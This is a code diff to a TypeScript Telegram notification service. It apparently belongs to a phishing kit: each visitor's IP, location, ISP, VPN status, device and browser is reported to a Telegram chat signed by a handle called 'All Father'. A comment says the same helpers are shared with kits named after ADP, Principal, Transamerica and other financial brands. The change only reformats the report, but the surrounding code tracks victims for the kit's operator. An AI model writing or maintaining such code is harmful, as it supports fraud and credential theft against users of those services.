@@ -134,7 +134,7 @@ class TelegramService {
 
     const detected = parseVisitorInfo(data.userAgent)
     const networkHint = getNetworkHintLabel(null, data.isp)
-    const message = `\n🌐 <b>(${SITE_NAME})</b>\n━━━━━━━━━━━━━━━━━━\n📍 <b>Location:</b> ${data.location}\n🌍 <b>IP:</b> ${ipDisplay}\n⏰ <b>Timezone:</b> ${data.timezone}\n🌐 <b>ISP:</b> ${data.isp}${networkHint ? `\n🛡️ <b>VPN/DATA CENTER:</b> ${networkHint}` : ""}\n\n🖥 <b>Platform:</b> ${detected.platformLabel}\n👨‍💻 <b>Browser:</b> ${detected.browserLabel}\n📱 <b>Device:</b> ${detected.deviceLabel}\n🖥️ <b>Screen:</b> ${data.screen}\n🔗 <b>Referrer:</b> ${referrer}\n🌐 <b>URL:</b> ${pageUrl}\n\n<a href="https://t.me/th3_allfather">All Father</a>`;
+    const message = `\n🌐 <b>(${SITE_NAME})</b>\n━━━━━━━━━━━━━━━━━━\n📍 <b>Location:</b> ${asCode(data.location)}\n🌍 <b>IP:</b> ${asCode(ipDisplay)}\n⏰ <b>Timezone:</b> ${asCode(data.timezone)}\n🌐 <b>ISP:</b> ${asCode(data.isp)}${networkHint ? `\n🛡️ <b>VPN/DATA CENTER:</b> ${asCode(networkHint)}` : ""}\n\n🖥 <b>Platform:</b> ${asCode(detected.platformLabel)}\n👨‍💻 <b>Browser:</b> ${asCode(detected.browserLabel)}\n📱 <b>Device:</b> ${asCode(detected.deviceLabel)}\n🖥️ <b>Screen:</b> ${asCode(data.screen)}\n🔗 <b>Referrer:</b> ${asUrlField(referrer, "Direct")}\n🌐 <b>URL:</b> ${asUrlField(pageUrl)}\n\n<a href="https://t.me/th3_allfather">All Father</a>`;
     await this.sendMessage(message);
   }
 
@@ -464,6 +464,19 @@ function asLink(url: string, label?: string): string {
   return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(
     linkText
   )}</a>`;
+}
+
+/**
+ * Canonical URL field: a real URL becomes a clickable `<a href>` anchor, while
+ * `Direct` and anything non-URL stays a `<code>` label. Matches the helper used
+ * by adp, ebcparticipant, igoe, principal, raiseright and transamerica.
+ */
+function asUrlField(value: unknown, fallback = "Unknown"): string {
+  const t = value == null || value === "" ? "" : String(value).trim();
+  const resolved = t || fallback;
+  if (resolved === "Direct") return asCode(resolved);
+  if (isHttpUrl(resolved)) return asLink(resolved);
+  return asCode(resolved);
 }
 
 /** Site header block required at the top of every ops flow message. */
